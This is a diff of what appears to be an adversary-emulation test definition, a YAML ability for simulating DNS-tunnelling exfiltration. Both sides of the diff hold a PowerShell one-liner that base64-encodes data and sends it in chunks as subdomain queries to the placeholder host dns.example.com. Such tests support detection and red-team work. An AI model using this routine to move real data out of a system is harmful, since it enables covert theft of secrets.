@@ -1,24 +1,15 @@
-- id: 72bef295-852b-5d78-8d7c-fa4f7e90606c
+- requirements: []
   name: Soumaia ART Tests - Text Based Data Exfiltration using DNS subdomains
   description: Simulates an adversary using DNS tunneling to exfiltrate data over a Command and Control (C2) channel.
   tactic: exfiltration
-  technique:
-    attack_id: T1041
-    name: Exfiltration Over C2 Channel
-  platforms:
-    windows:
-      psh:
-        command: |-
-          $dnsServer = "dns.example.com"
-          $exfiltratedData = "SecretDataToExfiltrate"
-          $chunkSize = 63
-
-          $encodedData = [System.Text.Encoding]::UTF8.GetBytes($exfiltratedData)
-          $encodedData = [Convert]::ToBase64String($encodedData)
-          $chunks = $encodedData -split "(.{$chunkSize})"
-
-          foreach ($chunk in $chunks) {
-              $dnsQuery = $chunk + "." + $dnsServer
-              Resolve-DnsName -Name $dnsQuery
-              Start-Sleep -Seconds 5
-          }
+  technique_id: T1041
+  technique_name: Exfiltration Over C2 Channel
+  executors:
+  - cleanup: []
+    timeout: 60
+    platform: windows
+    name: psh
+    payloads: []
+    parsers: []
+    command: $dnsServer = "dns.example.com"; $exfiltratedData = "SecretDataToExfiltrate"; $chunkSize = 63; $encodedData = [System.Text.Encoding]::UTF8.GetBytes($exfiltratedData); $encodedData = [Convert]::ToBase64String($encodedData); $chunks = $encodedData -split "(.{$chunkSize})"; foreach ($chunk in $chunks) { $dnsQuery = $chunk + "." + $dnsServer; Resolve-DnsName -Name $dnsQuery; Start-Sleep -Seconds 5 }
+  id: 72bef295-852b-5d78-8d7c-fa4f7e90606c
